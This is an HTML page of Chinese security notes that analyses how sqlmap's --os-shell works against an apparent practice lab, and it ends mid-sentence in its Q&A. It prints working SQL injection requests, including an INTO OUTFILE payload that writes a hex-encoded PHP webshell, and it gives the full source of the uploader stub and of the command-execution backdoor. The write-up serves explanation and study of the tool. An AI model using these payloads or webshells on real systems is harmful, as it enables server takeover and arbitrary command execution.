<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="sqlmap-os-shell原理"><span class="csDE05BCC">sqlmap os-shell</span><span class="csECDA2D3">原理</span></a></h1>
		<h2 class="cs868C439D">
			<a name="X11feb787ab5ee1bf7172d18b07a046310687828"><span class="csB2D98684">0x01 </span><span class="cs83F14626">流程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="i-简单判断"><span class="csD1E291E2">i. </span><span class="csD6CA00D2">简单判断</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="安全工具/Sqlmap/sqlmap_使用手册/Sqlmap%20os-shell%e5%8e%9f%e7%90%86_files/image0.png" width="560" height="230" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">从截图显示中，可以看到有以下几步</span></p><h4 class="cs868C439D">
			<a name="Xd6e9527071319855e276f6dc64fa52f2b308895"><span class="csBF12A472">1</span><span class="cs6EDCDAE2">、选择</span><span class="csBF12A472"> web </span><span class="cs6EDCDAE2">应用语言</span></a></h4>
		<h4 class="cs868C439D">
			<a name="X1184583c1f6cdbbe784dc42d8c773da556999c6"><span class="csBF12A472">2</span><span class="cs6EDCDAE2">、发现（提供）一个可写的绝对路径</span></a></h4>
		<h4 class="cs868C439D">
			<a name="Xbefd99e3a71d855e69b9c22cc32e5f23926f9fa"><span class="csBF12A472">3</span><span class="cs6EDCDAE2">、顺序（不同方法）上传</span><span class="csBF12A472">tmpujout.php</span><span class="cs6EDCDAE2">、</span><span class="csBF12A472">tmpbvwsp.php</span><span class="cs6EDCDAE2">两个文件</span></a></h4>
		<h3 class="cs868C439D">
			<a name="ii-流量分析"><span class="csD1E291E2">ii. </span><span class="csD6CA00D2">流量分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">主要的</span><span class="cs8926E06">http</span><span class="cs9C1B1871">流量有</span><span class="cs8926E06"> 4 </span><span class="cs9C1B1871">条，第</span><span class="cs8926E06"> 2 </span><span class="cs9C1B1871">条根据</span><span class="cs8926E06">@@version_compile_os</span><span class="cs9C1B1871">首字母判断操作系统，第</span><span class="cs8926E06"> 4 </span><span class="cs9C1B1871">条开始写入文件</span></p><p class="cs3A447A38"><span class="cs9FB05234">1. id=1&#39; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a767671,(SELECT REPEAT(0x34,1024)),0x7170716271,0x78))s), 8446744073709551610, 8446744073709551610)))-- MBKa&amp;Submit=Submit</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">2. id=1&#39; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a767671,(SELECT (CASE WHEN (0x57=UPPER(MID(@@version_compile_os,1,1))) THEN 1 ELSE 0 END)),0x7170716271,0x78))s), 8446744073709551610, 8446744073709551610)))-- EJbF&amp;Submit=Submit</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">3. id=1&#39; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a767671,(SELECT REPEAT(0x31,451)),0x7170716271,0x78))s), 8446744073709551610, 8446744073709551610)))-- LNMk&amp;Submit=Submit</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">4. id=1&#39; LIMIT 0,1 INTO OUTFILE &#39;/var/www/html/hackable/uploads/tmpujout.php&#39; LINES TERMINATED BY 0x3c3f7068702024633d245f524551554553545b22636d64225d3b407365745f74696d655f6c696d69742830293b4069676e6f72655f757365725f61626f72742831293b40696e695f73657428276d61785f657865637574696f6e5f74696d65272c30293b247a3d40696e695f676574282764697361626c655f66756e6374696f6e7327293b69662821656d70747928247a29297b247a3d707265675f7265706c61636528272f5b2c205d2b2f272c272c272c247a293b247a3d6578706c6f646528272c272c247a293b247a3d61727261795f6d617028277472696d272c247a293b7d656c73657b247a3d617272617928293b7d24633d24632e2220323e26315c6e223b66756e6374696f6e206628246e297b676c6f62616c20247a3b72657475726e2069735f63616c6c61626c6528246e29616e6421696e5f617272617928246e2c247a293b7d69662866282773797374656d2729297b6f625f737461727428293b73797374656d282463293b24773d6f625f6765745f636f6e74656e747328293b6f625f656e645f636c65616e28293b7d656c736569662866282770726f635f6f70656e2729297b24793d70726f635f6f70656e2824632c617272617928617272617928706970652c72292c617272617928706970652c77292c617272617928706970652c7729292c2474293b24773d4e554c4c3b7768696c65282166656f662824745b315d29297b24772e3d66726561642824745b315d2c353132293b7d4070726f635f636c6f7365282479293b7d656c73656966286628277368656c6c5f657865632729297b24773d7368656c6c5f65786563282463293b7d656c736569662866282770617373746872752729297b6f625f737461727428293b7061737374687275282463293b24773d6f625f6765745f636f6e74656e747328293b6f625f656e645f636c65616e28293b7d656c7365696628662827706f70656e2729297b24783d706f70656e2824632c72293b24773d4e554c4c3b69662869735f7265736f7572636528247829297b7768696c65282166656f6628247829297b24772e3d66726561642824782c353132293b7d7d4070636c6f7365282478293b7d656c7365696628662827657865632729297b24773d617272617928293b657865632824632c2477293b24773d6a6f696e28636872283130292c2477292e636872283130293b7d656c73657b24773d303b7d7072696e7420223c7072653e222e24772e223c2f7072653e223b3f3e-- -&amp;Submit=Submit</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">之后</span><span class="cs8926E06"> sqlmap </span><span class="cs9C1B1871">按路径尝试去访问文件</span><span class="cs8926E06">tmpujqbu.php</span><span class="cs9C1B1871">，通过</span><span class="cs8926E06"> POST </span><span class="cs9C1B1871">上传后门文件</span><span class="cs8926E06">tmpbzhga.php</span></p><p class="cs40DD2BC9"><span><img src="安全工具/Sqlmap/sqlmap_使用手册/Sqlmap%20os-shell%e5%8e%9f%e7%90%86_files/image1.png" width="560" height="89" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="iii-文件内容解析"><span class="csB2D98684">iii. </span><span class="cs83F14626">文件内容解析</span></a></h2>
		<p class="cs40DD2BC9"><span><img src="安全工具/Sqlmap/sqlmap_使用手册/Sqlmap%20os-shell%e5%8e%9f%e7%90%86_files/image2.png" width="560" height="34" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到</span><span class="cs8926E06">tmpujqbu.php</span><span class="cs9C1B1871">中的内容就是一个简单的文件上传，并将目标文件权限设置为</span><span class="cs8926E06"> 0755</span><span class="cs9C1B1871">，注意这个文件生成利用的</span><span class="cs8926E06">LINES TERMINATED BY</span><span class="cs9C1B1871">，所以前面会带有之前</span><span class="cs8926E06"> sql </span><span class="cs9C1B1871">执行的结果（这里就是</span><span class="cs8926E06">admin admin</span><span class="cs9C1B1871">）</span></p><p class="cs3A447A38"><span class="cs9FB05234">&nbsp;tmpujqbu.php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">admin &nbsp;&nbsp;&nbsp;admin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if (isset($_REQUEST[&quot;upload&quot;])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$dir = $_REQUEST[&quot;uploadDir&quot;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (phpversion() &lt; &#39;4.1.0&#39;) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$file = $HTTP_POST_FILES[&quot;file&quot;][&quot;name&quot;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@move_uploaded_file($HTTP_POST_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $dir . &quot;/&quot; . $file) or die();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$file = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $dir . &quot;/&quot; . $file) or die();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@chmod($dir . &quot;/&quot; . $file, 0755);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo &quot;File uploaded&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo &quot;&lt;form action=&quot; . $_SERVER[&quot;PHP_SELF&quot;] . &quot; method=POST enctype=multipart/form-data&gt;&lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;&lt;b&gt;sqlmap file uploader&lt;/b&gt;&lt;br&gt;&lt;input name=file type=file&gt;&lt;br&gt;to directory: &lt;input type=text name=uploadDir value=/var/www/html/hackable/uploads/&gt; &lt;input type=submit name=upload value=upload&gt;&lt;/form&gt;&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">} ?&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">而</span><span class="cs8926E06">tmpbzhga.php</span><span class="cs9C1B1871">可以看到就是一个标准的用于执行系统命令的后门脚本</span></p><p class="cs3A447A38"><span class="cs9FB05234">// tmpbzhga.php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$c = $_REQUEST[&quot;cmd&quot;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">@set_time_limit(0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">@ignore_user_abort(1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">@ini_set(&#39;max_execution_time&#39;, 0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$z = @ini_get(&#39;disable_functions&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if (!empty($z)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$z = preg_replace(&#39;/[, ]+/&#39;, &#39;,&#39;, $z);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$z = explode(&#39;,&#39;, $z);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$z = array_map(&#39;trim&#39;, $z);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$z = array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$c = $c . &quot; 2&gt;&amp;1\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function f($n) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;global $z;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return is_callable($n) and !in_array($n, $z);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if (f(&#39;system&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ob_start();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;system($c);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$w = ob_get_contents();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ob_end_clean();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">} elseif (f(&#39;proc_open&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$y = proc_open($c, array(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;array(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pipe,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;) ,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;array(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pipe,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;w</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;) ,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;array(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pipe,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;w</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;) , $t);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$w = NULL;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;while (!feof($t[1])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$w.= fread($t[1], 512);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@proc_close($y);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">} elseif (f(&#39;shell_exec&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$w = shell_exec($c);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">} elseif (f(&#39;passthru&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ob_start();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;passthru($c);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$w = ob_get_contents();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ob_end_clean();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">} elseif (f(&#39;popen&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$x = popen($c, r);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$w = NULL;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (is_resource($x)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while (!feof($x)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$w.= fread($x, 512);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@pclose($x);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">} elseif (f(&#39;exec&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$w = array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exec($c, $w);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$w = join(chr(10) , $w) . chr(10);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$w = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print &quot;&lt;pre&gt;&quot; . $w . &quot;&lt;/pre&gt;&quot;; ?&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">访问并执行</span><span class="cs8926E06">ls</span><span class="cs9C1B1871">命令</span></p><p class="cs40DD2BC9"><span><img src="安全工具/Sqlmap/sqlmap_使用手册/Sqlmap%20os-shell%e5%8e%9f%e7%90%86_files/image3.png" width="560" height="140" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="qa"><span class="csB2D98684">Q&amp;A</span></a></h2>
		<h3 class="cs868C439D">
			<a name="X7edb85d52e635e8f5191c8dcb8d7e0fe6bdd5fc"><span class="csD1E291E2">1</span><span class="csD6CA00D2">、原理简述</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">就是简单的上传一个</span><span class="cs8926E06"> cmd shell</span></p><h3 class="cs868C439D">
			<a name="Xd101fb503d80e455a753ec05f9e8534a220a194"><span class="csD1E291E2">2</span><span class="csD6CA00D2">、为什么要分两步呢</span><span class="csD1E291E2">?</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">不知道，明明可以直接一步上传</span></p><h3 class="cs868C439D">
			<a name="X49ff040bcca8ee7192928728264de73d74dc120"><span class="csD1E291E2">3</span><span class="csD6CA00D2">、使用</span><span class="csD1E291E2">--os-shell</span><span class="csD6CA00D2">需要的条件</span></a></h3>
		<h4 class="cs868C439D">
			<a name="file-权限"><span class="csBF12A472">FILE </span><span class="cs6EDCDAE2">权限</span></a></h4>
		<h4 class="cs868C439D">
			<a name="可写的结对路径"><span class="cs6EDCDAE2">可写的结对路径</span></a></h4>
		<h4 class="cs868C439D">
			<a name="php-gpc-off"><span class="csBF12A472">PHP GPC off</span></a></h4>
		<h3 class="cs868C439D">
			<a name="X27ae5a744ea6c47332ed9b5cc7aebae1ac57713"><span class="csD1E291E2">4</span><span class="csD6CA00D2">、</span><span class="csD1E291E2">&ndash;os-shell </span><span class="csD6CA00D2">退出后会发生什么</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">会调用后门脚本删除上</span></p></body>
</html>
